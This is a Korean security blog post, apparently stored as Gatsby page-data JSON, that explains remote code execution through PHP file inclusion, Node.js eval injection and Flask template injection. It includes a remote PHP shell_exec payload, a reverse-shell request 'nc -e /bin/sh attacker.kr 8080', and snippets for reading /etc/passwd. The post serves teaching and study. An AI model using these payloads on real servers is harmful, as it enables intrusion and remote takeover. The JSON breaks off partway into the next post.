{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/web_application_rce1/",
    "result": {"data":{"cur":{"id":"3ab051f3-c86f-5f40-854c-ea4cc1b44cac","html":"<h1 id=\"quickstart\" style=\"position:relative;\"><a href=\"#quickstart\" aria-label=\"quickstart permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>QuickStart</h1>\n<h2 id=\"web-application-rce-case\" style=\"position:relative;\"><a href=\"#web-application-rce-case\" aria-label=\"web application rce case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Web Application RCE Case</h2>\n<h3 id=\"php\" style=\"position:relative;\"><a href=\"#php\" aria-label=\"php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP</h3>\n<ul>\n<li>File Inclusion, File upload, …</li>\n</ul>\n<h3 id=\"nodejs\" style=\"position:relative;\"><a href=\"#nodejs\" aria-label=\"nodejs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>NodeJS</h3>\n<ul>\n<li>Code Injection, Unserialize, …</li>\n</ul>\n<h3 id=\"flask\" style=\"position:relative;\"><a href=\"#flask\" aria-label=\"flask permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Flask</h3>\n<ul>\n<li>Server Side Template Injection, …</li>\n</ul>\n<h2 id=\"rce-case1-php\" style=\"position:relative;\"><a href=\"#rce-case1-php\" aria-label=\"rce case1 php permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RCE Case1 #PHP</h2>\n<h3 id=\"file-inclusion\" style=\"position:relative;\"><a href=\"#file-inclusion\" aria-label=\"file inclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>File Inclusion</h3>\n<ul>\n<li>php <code class=\"language-text\">include</code> 키워드는 <code class=\"language-text\">text/code/markup</code> 형식의 파일을 읽어와 php 파일의 내용을 다른 PHP 파일에 삽입할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>file<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<ul>\n<li>예시로 공격 대상 서버에 <code class=\"language-text\">include</code>가 가능한 경우 RCE가 가능한 페이로드를 업로드하여 호출함으로 써 공격이 가능해진다.</li>\n</ul>\n<p><strong>request</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\"># > https://victim.kr/index.php?file=https://attacker.kr/payload.txt&amp;cmd=id</span></code></pre></div>\n<p><strong>payload.txt</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span></code></pre></div>\n<p><strong>response</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">uid<span class=\"token operator\">=</span><span class=\"token number\">20080</span> gid<span class=\"token operator\">=</span><span class=\"token number\">1001</span> groups<span class=\"token operator\">=</span><span class=\"token number\">1001</span></code></pre></div>\n<ul>\n<li>공격자의 <code class=\"language-text\">payload</code> 데이터를 include 하였기 때문에 원하는 방향으로 수행할 수 있는 구조가 생긴다.</li>\n</ul>\n<h3 id=\"file-inclusion-technique\" style=\"position:relative;\"><a href=\"#file-inclusion-technique\" aria-label=\"file inclusion technique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>File Inclusion technique</h3>\n<h4 id=\"맛있는-code-classlanguage-textincludecode-할-대상-파일\" style=\"position:relative;\"><a href=\"#%EB%A7%9B%EC%9E%88%EB%8A%94-code-classlanguage-textincludecode-%ED%95%A0-%EB%8C%80%EC%83%81-%ED%8C%8C%EC%9D%BC\" aria-label=\"맛있는 code classlanguage textincludecode 할 대상 파일 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>맛있는 <code class=\"language-text\">include</code> 할 대상 파일</h4>\n<ul>\n<li><code class=\"language-text\">/etc/passwd</code> : 리눅스 계정 목록 [Local File]</li>\n<li><code class=\"language-text\">/proc/self/maps</code> : 프로그램 메모리 덩보 [Local File]</li>\n<li><code class=\"language-text\">/var/www/html/[payload.*]</code> : 코드를 실행할 수 있는 php 코드 [Local File]</li>\n<li><code class=\"language-text\">https://attacker.kr/payload.txt</code> : 코드를 실행할 수 있는 php 코드 [Remote File]</li>\n</ul>\n<h4 id=\"시도-해-볼-만한-함수\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%8F%84-%ED%95%B4-%EB%B3%BC-%EB%A7%8C%ED%95%9C-%ED%95%A8%EC%88%98\" aria-label=\"시도 해 볼 만한 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시도 해 볼 만한 함수</h4>\n<ul>\n<li><code class=\"language-text\">echo \"data\";</code> : 문자 출력</li>\n<li><code class=\"language-text\">phpinfo();</code> : php 정보 출력</li>\n<li><code class=\"language-text\">system(\"id\")</code> : system 명령어 수행</li>\n<li><code class=\"language-text\">passthru(\"id\")</code> : passthru 명령어 수행</li>\n<li><code class=\"language-text\">file_put_contents(\"/tmp/test.txt\", \"data\")</code> : 파일 쓰기(생성)</li>\n<li><code class=\"language-text\">file_get_contents(\"/tmp/test.txt\")</code> : 파일 읽기</li>\n</ul>\n<h2 id=\"rce-case2-nodejs\" style=\"position:relative;\"><a href=\"#rce-case2-nodejs\" aria-label=\"rce case2 nodejs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RCE Case2 #NodeJS</h2>\n<h3 id=\"nodejs-code-injection\" style=\"position:relative;\"><a href=\"#nodejs-code-injection\" aria-label=\"nodejs code injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>NodeJS Code Injection</h3>\n<p><strong>request</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//> http://victim.kr/api/v1/data/require(\"child_process\").exec(\"nc -e /bin/sh attacker.kr 8080\")</span></code></pre></div>\n<p><strong>attacker server</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"># nc <span class=\"token operator\">-</span>lvp <span class=\"token number\">8888</span></code></pre></div>\n<ul>\n<li>대상 서버상 내부적으로 처리하는 구간에서 <code class=\"language-text\">경로</code>,<code class=\"language-text\">쿼리</code>등의 데이터가 내부 javascript로 해석되어 실행되는 구간이 존재하는 경우 위와 같은 공격을 이용하여 RCE이 수행이 가능</li>\n</ul>\n<p><strong>victim.kr 내부 구현</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token operator\">...</span>\n<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>data_input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// data_input은 위의 request에서 전달받은 데이터</span>\n<span class=\"token operator\">...</span></code></pre></div>\n<ul>\n<li>대상 서버 내부 구현은 다음과 같이 입력 된 데이터가 <code class=\"language-text\">eval</code> api를 통한 문자열이 javascript로 해석되어 실행되는 구간으로 동작하기 때문</li>\n</ul>\n<h4 id=\"nodejs-code-injection-technique\" style=\"position:relative;\"><a href=\"#nodejs-code-injection-technique\" aria-label=\"nodejs code injection technique permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>NodeJS Code Injection technique</h4>\n<h4 id=\"fs-class\" style=\"position:relative;\"><a href=\"#fs-class\" aria-label=\"fs class permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>fs class</strong></h4>\n<ul>\n<li>공격시 대상 서버의 파일을 읽는 경우 <code class=\"language-text\">require('fs')</code> 모듈을 활용하여 파일 시스템(파일 읽기, 쓰기, 삭제)을 제어할 수 있으며 다양한 방식으로 활용된다.</li>\n</ul>\n<p><strong>readdir()</strong></p>\n<ul>\n<li>fs class의 <code class=\"language-text\">readdir()</code>, <code class=\"language-text\">readdirSync()</code> 메서드를 통해 대상 서버의 디렉터리 내용을 나열할 수 있다. 후자가 동기식 버전 말고는 동일하다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfs<span class=\"token punctuation\">.</span><span class=\"token function\">readdir</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfs<span class=\"token punctuation\">.</span><span class=\"token function\">readdir</span><span class=\"token punctuation\">(</span><span class=\"token string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p><strong>readFile()</strong></p>\n<ul>\n<li>공격자는 앞서 서버 디렉토리 구조를 파악한 후 <code class=\"language-text\">readFile()</code>, <code class=\"language-text\">readFileSync()</code> 메서드를 활용하여 파일의 내용을 읽을 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nfs<span class=\"token punctuation\">.</span><span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p><strong>Child Process</strong></p>\n<ul>\n<li>공격자는 <code class=\"language-text\">child_process</code> 모듈을 사용해 Node.js 에서 작식 프로세스를 생성하여 자식 프로세스로 <code class=\"language-text\">spawn(), fork(), exec(), execFile()</code> 등의 메서드를 실행할 수 있다.</li>\n<li><code class=\"language-text\">spawn()</code> 함수는 Stream 데이터를 반환하고 <code class=\"language-text\">exec()</code> 함수는 전체 버퍼 출력을 반환한다.</li>\n</ul>\n<h4 id=\"ncat\" style=\"position:relative;\"><a href=\"#ncat\" aria-label=\"ncat permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>Ncat</strong></h4>\n<ul>\n<li>공격자는 앞서 페이로드를 구성한후 자신의 서버로 대상 서버를 연결하기 위해 Revers Shell을 설정하기 위해 Ncat를 활용한다.</li>\n<li></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// > http://victim.kr/api/v1/data/require(\"child_process\").exec(\"nc -e /bin/sh attacker.kr 8080\")</span>\n<span class=\"token comment\">// &lt; nc -lvp 8888</span></code></pre></div>\n<h2 id=\"rce-case3-flaskjinja2\" style=\"position:relative;\"><a href=\"#rce-case3-flaskjinja2\" aria-label=\"rce case3 flaskjinja2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RCE Case3 #Flask/Jinja2</h2>\n<h3 id=\"flask-server-side-template-injection\" style=\"position:relative;\"><a href=\"#flask-server-side-template-injection\" aria-label=\"flask server side template injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Flask Server Side Template Injection</h3>\n<ul>\n<li>Server Side Template Injection을 서버에서 임의 코드를 실행 할 수 있는 사용자 입력 값에 Template keyword를 삽입해서 Tempalte Engine에서 해당 입력 값을 기반으로 데이터를 렌더링되어 실행된다.</li>\n</ul>\n<p><strong>victim.kr 내부 서버 구현</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>\n        <span class=\"token string\">'&lt;h1>{{ request.args.get(\"input\") }}&lt;/h1>'</span>\n    <span class=\"token punctuation\">)</span></code></pre></div>\n<p><strong>request</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># http://victim.kr/?input={{4*4}}</span></code></pre></div>\n<p><strong>response</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># > &lt;h1>16&lt;/h1></span></code></pre></div>\n<ul>\n<li>대상 내부 서버에서는 input 쿼리 값으로 request get 요청을 통해 입력 받아 <code class=\"language-text\">render_template_string</code> 메서드를 활용해 rednering되어 출력된다. <code class=\"language-text\">{{4*4}}</code>을 입력하여 SSTI 수행 시 템플릿 엔지이 해당 식을 해석하여 <code class=\"language-text\">16</code>을 반환한다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#web-application-rce-case\">Web Application RCE Case</a></p>\n<ul>\n<li><a href=\"#php\">PHP</a></li>\n<li><a href=\"#nodejs\">NodeJS</a></li>\n<li><a href=\"#flask\">Flask</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rce-case1-php\">RCE Case1 #PHP</a></p>\n<ul>\n<li>\n<p><a href=\"#file-inclusion\">File Inclusion</a></p>\n</li>\n<li>\n<p><a href=\"#file-inclusion-technique\">File Inclusion technique</a></p>\n<ul>\n<li><a href=\"#%EB%A7%9B%EC%9E%88%EB%8A%94-include-%ED%95%A0-%EB%8C%80%EC%83%81-%ED%8C%8C%EC%9D%BC\">맛있는 <code class=\"language-text\">include</code> 할 대상 파일</a></li>\n<li><a href=\"#%EC%8B%9C%EB%8F%84-%ED%95%B4-%EB%B3%BC-%EB%A7%8C%ED%95%9C-%ED%95%A8%EC%88%98\">시도 해 볼 만한 함수</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rce-case2-nodejs\">RCE Case2 #NodeJS</a></p>\n<ul>\n<li>\n<p><a href=\"#nodejs-code-injection\">NodeJS Code Injection</a></p>\n<ul>\n<li><a href=\"#nodejs-code-injection-technique\">NodeJS Code Injection technique</a></li>\n<li><a href=\"#fs-class\"><strong>fs class</strong></a></li>\n<li><a href=\"#ncat\"><strong>Ncat</strong></a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rce-case3-flaskjinja2\">RCE Case3 #Flask/Jinja2</a></p>\n<ul>\n<li><a href=\"#flask-server-side-template-injection\">Flask Server Side Template Injection</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"QuickStart Web Application RCE Case PHP File Inclusion, File upload, … NodeJS Code Injection, Unserialize, … Flask Server Side Template Injection, … RCE Case1 #PHP File Inclusion php  키워드는  형식의 파일을 읽어와 php 파일의 내용을 다른 PHP 파일에 삽입할 수 있다. 예시로 공격 대상 서버에 가 가능한 경우 RCE가 가능한 페이로드를 업로드하여 호출함으로 써 공격이 가능해진다. request payload.txt response 공격자의  데이터를 include 하였기 때문에 원하는 방향으로 수행할 수 있는 구조가 생긴다. File Inclusion technique 맛있는  할 대상 파일  : 리눅스 계정 목록 [Local File]  : 프로그램 메모리 덩보 [Local File]  : 코드를 실행할 수 있는 php 코드 [Lo…","frontmatter":{"date":"December 25, 2021","title":"Web Application RCE Case","categories":"Web","author":"Zer0Luck","emoji":"📣"},"fields":{"slug":"/web_application_rce1/"}},"next":{"id":"c04c445f-740b-5681-976e-b1cbd901859a","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 141.66666666666666%; position: relative; bottom: 0; left: 0; background-image: 